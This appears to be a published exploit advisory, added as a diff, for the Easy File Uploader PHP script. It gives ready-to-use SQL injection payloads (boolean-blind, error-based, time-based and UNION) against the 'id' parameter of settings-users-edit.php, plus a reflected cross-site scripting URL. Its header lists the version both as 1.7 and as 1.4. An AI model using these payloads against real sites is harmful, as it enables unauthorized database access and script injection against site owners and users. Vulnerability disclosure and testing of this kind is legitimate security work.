@@ -1,0 +1,48 @@
+# Exploit Title: Easy File Uploader 1.7 - SQL Injection / Cross-Site
+Scripting
+# Dork: N/A
+# Date: 22.05.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://codecanyon.net/item/easy-file-uploader-php-multiple-uploader-with-file-manager/17222287
+# Version: 1.4 / fourth update
+# Category: Webapps
+# Tested on: Kali linux
+# Description : Non-authorized users can perform the attack in the editing
+area.
+====================================================
+
+# PoC : SQLi :
+
+Parameter : id
+
+     Type : boolean-based blind
+     Demo :
+http://test.com/EasyFileUploader/settings-users-edit.php?id=1
+  Payload : id=1' RLIKE (SELECT (CASE WHEN (7769=7769) THEN 27 ELSE 0x28
+END))-- wKWi
+
+     Type : error-based
+  Payload : id=1' AND (SELECT 6379 FROM(SELECT
+COUNT(*),CONCAT(0x717a627671,(SELECT
+(ELT(6379=6379,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ATeG
+
+     Type : AND/OR time-based blind
+     Demo :
+http://test.com/EasyFileUploader/settings-users-edit.php?id=1
+  Payload : id=1' AND SLEEP(5)-- gTLZ
+
+     Type : UNION query
+     Demo :
+http://test.com/EasyFileUploader/settings-users-edit.php?id=1
+  Payload : id=-3300' UNION ALL SELECT
+NULL,NULL,CONCAT(0x717a627671,0x79556745594846426c69514d71737744775a6450464a5963786658766171476f447a79684675714a,0x7178707071),NULL,NULL,NULL,NULL,NULL,NULL#
+
+
+====================================================
+
+# PoC : XSS :
+
+  Payload :
+http://test.com/EasyFileUploader/settings-users-edit.php?id=%27%20%3C/script%3E%3Cscript%3Ealert%28%27akkus+keyney%27%29%3C/script%3E%E2%80%98
+;
